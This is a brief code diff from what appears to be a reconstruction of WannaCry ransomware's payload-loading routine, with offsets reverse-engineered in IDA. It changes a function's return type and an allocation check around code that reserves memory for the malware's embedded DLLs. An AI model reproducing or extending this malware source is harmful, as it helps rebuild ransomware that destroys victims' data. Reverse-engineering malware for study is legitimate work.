@@ -9,7 +9,7 @@ volatile HGLOBAL hDLL_x64;
 //read from Wannacry in IDA
 //also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
 //Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
-HGLOBAL initialize_payload()
+void initialize_payload()
 {
 	/*
 	32-bit dll start address 0x40B020, size is 0x4060 bytes
@@ -27,7 +27,7 @@ HGLOBAL initialize_payload()
 	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
 	
 	//if no errors continue
-	if(hDLL_x86 || hDLL_x64)
+	if(hDLL_x86 && hDLL_x64)
 	{
 		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
 		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
